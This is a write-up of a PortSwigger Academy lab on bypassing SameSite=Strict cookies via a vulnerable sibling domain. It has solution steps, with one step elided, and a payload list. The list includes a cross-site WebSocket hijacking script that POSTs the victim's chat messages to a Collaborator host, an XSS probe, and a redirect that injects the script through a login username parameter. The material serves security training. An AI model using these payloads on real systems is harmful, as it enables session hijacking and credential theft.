# Lab: SameSite Strict bypass via sibling domain

**Official lab:** [Lab: SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)

## Lab idea

This related browser-trust challenge centers on cross-site WebSocket hijacking (CSWSH), a live-chat feature, and a vulnerable sibling domain under SameSite=Strict cookies. It practices considering the wider same-site attack surface rather than treating the primary host in isolation.

## Vulnerability in brief
Cross-site request forgery (CSRF) is a web security vulnerability that tricks a user’s browser into sending an unintended, authenticated request to an application where that user is signed in. The browser may automatically attach session credentials, so the application can mistake the forged request for an action the user chose to perform. CSRF can also arise where browsers automatically supply credentials such as HTTP Basic authentication or client certificates. [Official topic](https://portswigger.net/web-security/csrf)

## Solution idea
1. In Burp's browser, go to the live chat feature and send a few messages.
2. In Burp, go to the Proxy > HTTP history tab and find the WebSocket handshake request.
3. Notice that this doesn't contain any unpredictable tokens, so may be vulnerable to CSWSH if you can bypass any SameSite cookie restrictions.
4. In the browser, refresh the live chat page.
- …
6. Study the HTTP interactions and notice that these contain the victim's chat history.
7. Find a message containing the victim's username and password.
8. Use the newly obtained credentials to log in to the victim's account and the lab is solved.

## Payloads / key values
- `GET /chat`
- `READY`
- `<script> var ws = new WebSocket('wss://YOUR-LAB-ID.web-security-academy.net/chat'); ws.onopen = function() { ws.send("READY"); }; ws.onmessage = function(event) { fetch('https://YOUR-COLLABORATOR-PAYLOAD.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data}); }; </script>`
- `SameSite=Strict`
- `Access-Control-Allow-Origin`
- `cms-YOUR-LAB-ID.web-security-academy.net`
- `Invalid username`
- `username`
- `<script>alert(1)</script>`
- `alert(1)`
- `POST /login`
- `GET`
- `<script> document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything"; </script>`

## Official source
- [PortSwigger Academy: Lab: SameSite Strict bypass via sibling domain](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain)
